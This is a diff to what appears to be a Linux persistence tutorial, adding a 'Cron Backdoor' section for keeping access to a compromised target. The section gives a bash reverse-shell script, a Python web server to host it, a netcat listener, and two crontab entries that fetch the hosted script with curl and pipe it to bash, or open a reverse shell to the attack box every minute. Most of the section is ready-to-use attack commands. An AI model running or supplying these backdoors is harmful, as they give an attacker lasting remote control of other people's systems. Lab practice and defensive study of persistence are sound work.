@@ -94,8 +94,35 @@ We covered a lot of ground today, thus I recommend finding two Linux virtual mac
 
 # //------------------------------------
 # Cron Backdoor
-
-asdfasdf\
+Cron jobs are often overlooked by daily users, thus making them a great place for us to maintain our access. I will cover two different cron job back door methods leaving it up to you to decide which you prefer.\
+\
+The first involves creating a bash script with this command\
+\
+#!/bin/bash\
+\
+bash -i >& /dev/tcp/[ip address]/[port] 0>&1\
+\
+Secondly, in the same directory as your newly created bash script start a python3 web server with the command:\
+\
+python3 -m http.server\
+\
+Finally set up your netcat listener on the same port specified in your script\
+\
+nc -nlvp [port #]\
+\
+imagehere\
+\
+Now with all that set up and ready to go switch back over to the target box and edit your user’s crontab with the following command:\
+\
+crontab -e\
+\
+Add the following two lines to their crontab:\
+\
+* * * * * shell ‘curl http://[attack box ip]/[file-name.sh] | bash’\
+* * * * * /bin/bash -c ‘/bin/bash -i >& /dev/tcp/[attack box ip]/[port] 0>&1’\
+The first will request your hosted bash script and download it to the attack box. Then it will execute the script due to the “| bash” specification in the command.\
+\
+The second requires no script, or webserver to operate it simply calls back to your attack box with a reverse shell every minute.\
 
 # //------------------------------------
 # PHP Backdoor
